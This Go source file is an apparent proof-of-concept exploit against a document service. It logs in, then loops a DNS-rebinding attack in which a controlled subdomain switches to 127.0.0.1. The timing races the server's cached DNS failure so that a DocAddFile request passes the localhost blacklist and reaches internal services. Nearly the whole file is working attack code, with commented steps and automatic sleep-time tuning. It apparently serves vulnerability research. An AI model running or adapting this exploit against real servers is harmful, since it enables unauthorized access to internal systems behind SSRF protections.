package main

import (
	"flag"
	"fmt"
	"net/url"
	"strings"
	"time"
)

var (
	ErrorTooLate  = fmt.Errorf("too late")
	ErrorTooEarly = fmt.Errorf("too early")
)

func main() {
	oxcRootUrl := flag.String("serverRoot", "http://172.16.66.130", "root url")
	oxcUsername := flag.String("username", "testuser", "username of any user")
	oxcPassword := flag.String("password", "secret", "password of the user")
	targetPath := flag.String("targetPath", "", "target url targetPath")
	targetPort := flag.String("targetPort", "80", "target port")
	payloadSize := flag.Int("payloadSize", 25, "url payload size")
	startSleepDuration := flag.Int("startSleepDuration", 6200, "start sleep duration in milliseconds")
	sleepDurationChange := flag.Int("sleepDurationChange", 200, "sleep duration change in milliseconds")

	flag.Parse()

	config := XCConfig{
		Root:     *oxcRootUrl,
		Username: *oxcUsername,
		Password: *oxcPassword,
	}

	fmt.Println("Logging in")
	client := NewXCClient(config)
	AssertOk(client.Login())

	sleepDuration := time.Duration(*startSleepDuration) * time.Millisecond
	change := time.Duration(*sleepDurationChange) * time.Millisecond
	for {
		fmt.Printf("\n\nTrying with sleep duration %s\n", sleepDuration.String())

		res, err := trySSRF(client, *targetPath, *targetPort, (*payloadSize)*1024*1024, sleepDuration)
		if err == nil {
			fmt.Printf("SSRF success, result: %v\n", *res)
			break
		} else {
			fmt.Printf("SSRF failed, error: %v\n", err)

			if err == ErrorTooEarly {
				sleepDuration += change
			} else if err == ErrorTooLate {
				sleepDuration -= change
			} else {
				panic(fmt.Sprintf("unexpected error %s", err))
			}
		}
	}
}

func trySSRF(client *XCClient, path string, port string, payloadSize int, sleepDuration time.Duration) (*DocAddFileResponse, error) {
	randomSubdomain := GenerateRandomName(DnsSubdomainLength)
	randomHost := BuildDnsHost(randomSubdomain)

	reqUrl, err := url.Parse("http://" + randomHost + ":" + port + "/" + path)
	AssertOk(err)
	fmt.Println("Request url: " + reqUrl.String())

	// Step 1: Trigger negative InetAddress cache
	fmt.Println("Triggering negative InetAddress cache")
	_, err = client.DocAddFile(reqUrl.String())
	if err == nil {
		panic("expected error")
	}

	// Step 2: Note the approximate time when cache entry was made
	start := time.Now()

	// Step 3: Tell the authoritative name server of domain pointer.pw
	// to return 127.0.0.1 for type A dns requests
	fmt.Println("Assigning 127.0.0.1 to subdomain")
	AssertOk(AssignDnsSubdomain(randomSubdomain))

	// Step 4: Sleep for specified duration such that InetAddress.getByName
	// will return cached response (SERVFAIL) at time of check and
	// will return 127.0.0.1 at time of use (url.openConnection())
	toSleep := sleepDuration - time.Now().Sub(start)
	fmt.Println("Sleep for " + toSleep.String())
	time.Sleep(toSleep)

	// Step 5: Execute the SSRF request
	fmt.Println("Triggering SSRF")
	resp, err := client.DocAddFile(buildBigURL(reqUrl, payloadSize))

	if err == nil {
		return resp, nil
	}

	if !strings.Contains(err.Error(), "GENERAL_ARGUMENTS_ERROR") {
		panic(fmt.Sprintf("unexpected error. make sure targetPath and targetPort is correct and points to a valid image file, error: %v", err))
	}

	// Step 6: If the SSRF attempt failed, find if the sleep duration
	// was high or low. If the sleep duration is low, during time of check
	// and time of use InetAddress.getByName will return the cached SERVFAIL
	// dns response. If the sleep duration is high, during time of check itself
	// InetAddress.getByName will issue a fresh dns query and validation will
	// fail since 127.0.0.1 is in the blacklist
	queryLog, err := GetDnsQueryLog(randomSubdomain)
	AssertOk(err)
	latest := GetLatestDnsQueryLogEntry(queryLog)
	isLatestQuerySuccess := latest.Rcode == 0

	if isLatestQuerySuccess {
		return nil, ErrorTooLate
	} else {
		return nil, ErrorTooEarly
	}
}

func buildBigURL(reqUrl *url.URL, size int) string {
	username := strings.Repeat("u", size)
	resUrl := reqUrl.Scheme + "://" + username + ":" + "password" + "@" + reqUrl.Host + reqUrl.Path
	return resUrl
}
